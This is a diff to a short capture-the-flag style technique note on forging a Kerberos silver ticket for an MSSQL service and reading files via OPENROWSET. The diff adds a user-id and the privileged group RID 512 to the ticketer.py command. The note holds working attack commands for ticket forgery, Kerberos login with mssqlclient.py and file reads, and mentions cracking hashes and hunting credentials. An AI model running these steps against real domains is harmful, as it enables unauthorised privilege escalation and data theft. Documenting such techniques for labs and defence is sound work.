@@ -9,7 +9,7 @@ tags: [windows, mssql, kerberos, silver-ticket, openrowset, privesc]
 
 ## Concept
 
-With the MSSQL service account's NTLM hash, forge a TGS for the `MSSQLSvc` SPN. The ticket includes arbitrary groups in the PAC, allowing `sysadmin`; `OPENROWSET(BULK ...)` reads files with those groups.
+With the MSSQL service account's NTLM hash, forge a TGS for the `MSSQLSvc` SPN. The ticket is issued with the service account user-id and arbitrary groups in the PAC, allowing `sysadmin`; `OPENROWSET(BULK ...)` reads files with those groups.
 
 ## When it applies
 
@@ -21,7 +21,7 @@ With the MSSQL service account's NTLM hash, forge a TGS for the `MSSQLSvc` SPN. 
 
 1. Compute the NTLM from the password or crack NetNTLMv2.
 2. Get the domain SID and a privileged group RID.
-3. Forge the ticket with `ticketer.py` and use it with `mssqlclient.py`.
+3. Forge the ticket with `ticketer.py`, setting the service user-id and groups, and use it with `mssqlclient.py`.
 4. Read files with `OPENROWSET`.
 5. Search histories for credentials.
 
@@ -29,7 +29,7 @@ With the MSSQL service account's NTLM hash, forge a TGS for the `MSSQLSvc` SPN. 
 
 ```bash
 ticketer.py -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> \
-  -spn MSSQLSvc/DC01.<DOMAIN>:1433 -groups 1105 <USER>
+  -spn MSSQLSvc/DC01.<DOMAIN>:1433 -user-id 1103 -groups '512,1105' <USER>
 KRB5CCNAME=<USER>.ccache mssqlclient.py -no-pass -k DC01.<DOMAIN>
 SQL> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
 ```
